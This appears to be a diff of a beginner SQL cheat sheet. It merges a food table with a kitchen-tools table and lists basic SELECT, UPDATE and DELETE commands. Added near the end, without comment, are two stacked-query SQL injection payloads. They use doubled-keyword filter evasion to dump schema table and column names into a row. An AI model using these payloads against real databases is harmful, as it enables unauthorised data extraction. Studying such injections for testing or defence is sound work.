@@ -1,25 +1,29 @@
 **Commands**
 
 SHOW TABLES;
-
-FOOD
-| Name     | Type      | Colour |
-|:---------|:---------:|-------:| 
-| Bread    | Carbs     | Brown  |
-| Rice     | Carbs     | White  |
-| Chicken  | Meat      | White  |
-| Beef     | Meat      | Red    |
-| Salmon   | Fish      | Pink   |
-| Tuna     | Fish      | Red    |
-| Broccoli | Vegetable | Green  |
-| Apple    | Fruit     | Red    |
-| Milk     | Dairy     | White  |
+| FOOD      |           |        | KITCHEN TOOLS |             |        |
+|:----------|:----------:|-------:|:--------------|:-----------:|-------:|
+| Name      | Type       | Colour | Tool Name     | Tool Type   | Colour |
+|:----------|:----------:|-------:|:--------------|:-----------:|-------:|
+| Bread     | Carbs      | Brown  | Knife         | Cutting     | Silver |
+| Rice      | Carbs      | White  | Spoon         | Utensil     | Grey   |
+| Chicken   | Meat       | White  | Pan           | Cookware    | Black  |
+| Beef      | Meat       | Red    | Grill         | Cookware    | Black  |
+| Salmon    | Fish       | Pink   | Spatula       | Utensil     | Red    |
+| Tuna      | Fish       | Red    | Tongs         | Utensil     | Silver |
+| Broccoli  | Vegetable  | Green  | Peeler        | Prep Tool   | Green  |
+| Apple     | Fruit      | Red    | Grater        | Prep Tool   | Silver |
+| Milk      | Dairy      | White  | Whisk         | Utensil     | Metal  |
 
 -  __View all data__  -  SELECT * FROM FOOD;
 -  __Select specific columns__  -  SELECT NAME, TYPE FROM FOOD;
 -  __Update a row__  -  UPDATE FOOD SET COLOUR = 'Light Brown' WHERE NAME = 'Bread';
 -  __Filter by type__  -  SELECT * FROM FOOD WHERE TYPE = 'Meat';
 -  __Delete a row__  -  DELETE FROM FOOD WHERE NAME = 'Tuna';
+
+1;UPDATE FOOD SET Name=concat((SSELECTELECT group_concat(table_name)FROM infoorrmation_schema.tables WHERE table_schema=database()));
+
+1;UPDATE FOOD SET country=concat((SSELECTELECT group_concat(column_name) FROM infoorrmation_schema.columns WHERE table_name='DESSERTS'));
 
 (*) -> wildcard selector (all fields / columns)
 (;) -> statement terminator
